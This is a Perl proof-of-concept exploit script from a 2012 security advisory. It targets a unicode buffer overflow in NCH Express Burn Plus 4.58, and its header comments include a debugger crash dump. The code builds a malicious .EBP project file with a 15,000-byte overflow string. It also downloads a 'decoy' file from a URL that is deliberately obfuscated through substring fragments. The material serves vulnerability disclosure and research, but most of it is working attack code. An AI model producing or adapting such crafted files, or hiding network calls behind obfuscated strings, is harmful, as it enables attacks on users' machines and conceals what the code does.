#!/usr/bin/perl
#
#
# Express Burn Plus v4.58 EBP Project File Handling Buffer Overflow PoC
#
#
# Vendor: NCH Software
# Product web page: http://www.nchsoftware.com
# Affected version: 4.58
#
# Summary: Express Burn is a program that allows you to create and copy many
# kinds of disc media, including Audio (audio CDs / .mp3 CDs), Video (DVDs),
# and Data (CDs / DVDs / Blu-ray).
#
# Desc: The vulnerability is caused due to a boundary error in the processing
# of a project file, which can be exploited to cause a unicode buffer overflow
# when a user opens e.g. a specially crafted .EBP file. Successful exploitation
# could allow execution of arbitrary code on the affected machine.
#
#
# ===========================================================================
#
# (13d4.a84): Access violation - code c0000005 (first chance)
# First chance exceptions are reported before any exception handling.
# This exception may be expected and handled.
# eax=050a8c70 ebx=004034fc ecx=00000041 edx=fc4d5390 esi=0157cf68 edi=001297fe
# eip=004678ef esp=00126420 ebp=001274c0 iopl=0         nv up ei pl nz na pe nc
# cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
# *** WARNING: Unable to verify checksum for image00400000
# *** ERROR: Module load completed but symbols could not be loaded for image00400000
# image00400000+0x678ef:
# 004678ef 66890c02        mov     word ptr [edx+eax],cx    ds:0023:0157e000=????
# 0:000> d eax
# 050a8c70  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
# 050a8c80  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
# 050a8c90  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
# 050a8ca0  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
# 050a8cb0  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
# 050a8cc0  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
# 050a8cd0  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
# 050a8ce0  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
# 0:000> d esi
# 0157cf68  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
# 0157cf78  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
# 0157cf88  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
# 0157cf98  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
# 0157cfa8  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
# 0157cfb8  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
# 0157cfc8  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
# 0157cfd8  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
#
# ===========================================================================
#
#
# Tested on: Microsoft Windows 7 Ultimate SP1 EN
#
#
# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
#                             Zero Science Lab - http://www.zeroscience.mk
#
#
# Advisory ID: ZSL-2012-5103
# Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2012-5103.php
#
#
# 25.08.2012
#

use Cwd;
use LWP::Simple;

print "\n
        #=---===---===---===---===---===---===---===---=#
        |                                               |
        |          Proof Of Concept script for          |
        |                                               |
        |     NCH Software Express Burn Plus v4.58      |
        |                                               |
        |                                               |
        |               ID: ZSL-2012-5103               |
        |                                               |
        |                      ---                      |
        |                                               |
        |               Copyleft (c) 2012               |
        |                                               |
        |  Zero Science Lab - http://www.zeroscience.mk |
        |                                               |
        #=---===---===---===---===---===---===---===---=#
        \n";

$file = "Exploit.EBP";

$zoom = substr(")aZh4/",3,1).substr("^7ttr",2,2).substr("p>eErZ",0,1).
        substr("7U:/.9",2,2).substr("v/!+T",1,1).substr("oL4z55",3,1).
        substr("erY3%",0,2).substr("8oscW1",1,3).substr("iLien@",2,3).
        substr("*hJ2ce",4,2).substr("6.#h1A",1,1).substr("mk-((",0,2).
        substr(">/cZo",1,2).substr("[Mood]4",3,2).substr("lesS?",1,2).
        substr("a*\@J/b",4,2).substr("lue8X",0,3).substr("fish6",0,4).
        substr(",,8Y.b",4,1).substr("GrUmp!",3,2).substr("1337:",2,1);

        print "\n\n\x20\x20\x1A Creating malicious project file...\n\n";
        $decoy = "440Hz.mp3";
        getstore($zoom, $decoy);
        print "\x20\x20\x1A Throwing decoy file: $decoy...\n";
        $buffer = "\x41\x41\x41\x41" x (15000/2);
        $dir = getcwd;
        $dir =~ s/\//\\/g;

$load = "<?xml version=\"1.0\"?>\<ExpressBurnProject type=\"0\"><Alb".
        "umTitle/><TrackList><Audiotrack file=\"$dir\\$decoy\" title".
        "=\"$buffer\" artist=\"Salvador\"/></TrackList>\r</ExpressBu".
        "rnProject>\r";

        open fp, ">./$file" || die "\n[-] Can't open $file: $!\n\n";
        print fp $load; close fp;
        print "\n\x20\x20\x19 File created successfully: $file ";
        $file = -s $file; print "($file bytes).\n\n\n";

##EOF